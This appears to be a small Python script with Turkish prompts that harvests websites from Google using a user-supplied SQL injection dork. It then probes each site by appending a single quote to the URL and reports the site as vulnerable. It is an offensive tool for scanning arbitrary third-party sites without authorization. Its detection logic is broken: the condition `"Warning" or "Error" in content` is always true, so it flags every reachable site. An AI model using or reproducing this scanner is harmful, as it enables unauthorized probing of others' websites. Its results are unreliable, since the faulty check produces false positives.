import google
import urllib.request
import requests
site_sayi = int(input('[*]Site sayisini girin: '))
dork = input("[*]SQL dorkunu girin: ")
def url_cek():
    for url in google.search(dork, num=site_sayi, stop=1):
        dosya = open("urller.txt", "a+")
        dosya.write(url + "\n")
def url_tara():
    liste = open("urller.txt", "r").readlines()
    for urller in liste:
        urller = urller.strip()
        try:
            r = requests.get(urller, timeout=5)
        except(requests.exceptions.Timeout, requests.exceptions.ConnectionError):
            continue
        if r.status_code == 200:
            yeni = r.url + "'"
            conn = requests.get(yeni,timeout=5)
            content = conn.text
            
            if "Warning" or "Error" in content:
                print('[+]', urller, "sql acigi vardir!")
            else:
                pass

    
        
            
url_cek()
url_tara()


